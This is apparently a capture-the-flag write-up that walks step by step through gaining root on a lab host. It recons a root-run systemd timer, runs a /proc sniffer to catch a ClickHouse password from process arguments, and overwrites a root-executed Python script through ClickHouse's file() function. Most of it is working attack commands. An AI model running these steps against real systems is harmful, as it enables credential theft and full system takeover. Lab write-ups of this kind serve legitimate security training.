# Root Flag — Stream

## 1. Recon the drainer

```bash
systemctl list-timers aidx-dlq-drainer.timer       # every 2 min, User=root
cat /etc/systemd/system/aidx-dlq-drainer.service   # ExecStart=/opt/ops/dlq_drainer.py
```

The drainer runs as **root** every 2 minutes and calls:

```bash
clickhouse-client --user default --password "$(cat /etc/partner-sync/ch.pw)" -q ...
```

`/etc/partner-sync/ch.pw` is `0600 root`. But `/proc` has **hidepid=off**, so argv of root processes is readable.

## 2. Sniff `/proc` for the ClickHouse `default` password

**On the target** (as `svc-infra` or `martin_cole`):

```bash
nohup python3 /dev/shm/proc_sniff.py \
  --needle clickhouse-client \
  --out /tmp/chhit.bin >/tmp/sniff.log 2>&1 &
```

**From Kali** — wake the drainer with malformed AIDX:

```bash
python3 scripts/aidx_ingest.py --target 10.129.15.255 --malformed
```

**Wait ≤2 min**, then read the capture:

```bash
tr '\0' ' ' < /tmp/chhit.bin | grep -B1 clickhouse-client | grep -v proc_sniff
```

`clickhouse-client` blanks the password in argv very shortly after start — the sniffer must be a **no-sleep busy loop**. The first hit contains the real value; later hits show spaces.

→ `CH_DEFAULT_PASS`

## 3. `GRANT FILE` → overwrite the formatter

```bash
HEX=$(xxd -p /tmp/aidx_quarantine_new.py | tr -d '\n')

python3 scripts/ch_http.py -u default -p "$CH_DEFAULT_PASS" \
  "INSERT INTO FUNCTION file('aidx_quarantine.py','RawBLOB') \
   SETTINGS engine_file_truncate_on_insert=1 \
   SELECT unhex('$HEX')"
```

> **NOTE:** the `RawBLOB` format exposes the file content as column `raw_blob` — not `raw`, not `data`, not `_`.

## 4. Trigger the drainer → root flag

```bash
python3 scripts/aidx_ingest.py --target 10.129.15.255 --malformed

sleep 130

sshpass -p '<MARTIN_PASS>' ssh martin_cole@10.129.15.255 'cat /tmp/rflag'
```
